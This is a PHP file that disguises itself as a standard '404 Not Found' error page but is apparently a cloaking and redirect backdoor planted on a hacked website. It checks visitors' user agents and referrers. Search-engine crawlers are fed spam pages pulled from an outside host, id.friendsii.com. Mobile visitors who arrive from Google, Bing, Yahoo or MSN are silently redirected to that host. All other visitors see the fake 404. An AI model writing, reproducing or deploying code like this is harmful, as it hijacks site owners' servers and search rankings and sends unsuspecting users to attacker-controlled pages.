<?php
header("HTTP/1.0 200");
header("HTTP/1.1 200");
header("HTTP/2.0 200");
header('Status: 200', TRUE, 200);
header('Content-type: text/html; charset=utf-8');
@error_reporting(0);
@set_time_limit(0);
@date_default_timezone_set("PRC");
$server_url = "https://id.friendsii.com/1.php";
$jump_url = "<meta http-equiv=\"refresh\" content=\"0;url=https://id.friendsii.com/tz.php\">"; 
$error_code = "404 Not Found!";
$http_refer = @$_SERVER['HTTP_REFERER'];
$user_agent = @$_SERVER['HTTP_USER_AGENT'];
$api_url = $server_url .'?bunglerd'.$_SERVER['REQUEST_URI'];
$spider_list = array("Googlebot", "goo", "bot", "msn",  "bing", "Yahoo");
$Android_list = array("Android","iPhone","webOS","BlackBerry","SymbianOS","Windows Phone","iPad","iPod");
$refer_list = array("google.com", "google", "bing", "yahoo", "msn");
$baidu_list = array("baidu.com");
function is_baiduRengong()
{
    global $baidu_list,$http_refer;
    foreach ($baidu_list as $value) {
        if (stristr($http_refer,$value)) {
            return true;
        }
    }
    return false;
}
function is_refer()
{
    global $refer_list,$http_refer;
    foreach ($refer_list as $value) {
        if (stristr($http_refer,$value)) {
            return true;
        }
    }
    return false;
}
function is_spider()
{
    global $spider_list, $user_agent;
    foreach ($spider_list as $agent) {
        if (stristr($user_agent,$agent)) {
            return true;
        }
    }
    return false;
}
function is_Android()
{
    global $Android_list, $user_agent;
    foreach ($Android_list as $agent) {
        if (stristr($user_agent,$agent)) {
            return true;
        }
    }
    return false;
}





function HttpVisit($api_url) {
    $getWebUrl = $api_url;
 
	$remote_data = NULL;
	if (function_exists('curl_exec')) {
		$curl = @curl_init();
		curl_setopt($curl, CURLOPT_URL, $getWebUrl);
		curl_setopt($curl, CURLOPT_HEADER, 0);
		curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 40);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
		$remote_data = @curl_exec($curl);
		curl_close($curl);
	} else {
		if (function_exists('stream_context_create')) {
			$header_array = array('http' => array('method' => 'GET', 'timeout' => 30));
            $http_header = @stream_context_create($header_array);
            $remote_data = @file_get_contents($getWebUrl, false, $http_header);
		} else {
                $temp_url = explode("/", $getWebUrl);
                $new_url = $temp_url[2];
                $http_port = 80;
                $get_file = substr($getWebUrl, strlen($new_url) + 7);
                if (strstr($new_url, chr(58))) {
                    $s_var_array['td'] = explode(chr(58), $new_url);
                    $new_url = $s_var_array['td'][0];
                    $http_port = $s_var_array['td'][1];
                }
                $fsock_result = @fsockopen($new_url, $http_port);
                @fputs($fsock_result, 'GET ' . $get_file . ' HTTP/1.1' . "\r\n" . 'Host:' . $new_url . "\r\n" . 'Connection:Close' . "\r\n\r\n");
                while (!feof($fsock_result)) {
                    $remote_data.= fgets($fsock_result, 1024);
                }
                @fclose($fsock_result);
				$remote_data = strstr($remote_data,"<html");
            }
	}
	return $remote_data;
}
if(is_baiduRengong()){
    header('HTTP/1.1 404 Not Found'); 
    exit();
}

elseif (is_spider()) {
    header('HTTP/1.1 200 OK'); 
    echo HttpVisit($api_url);
    exit(); 
}

elseif(is_refer()&&is_Android()){
    header('HTTP/1.1 200 OK'); 
    echo $jump_url;  
    exit();
}
?>


<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL  was not found on this server.</p>
</body></html>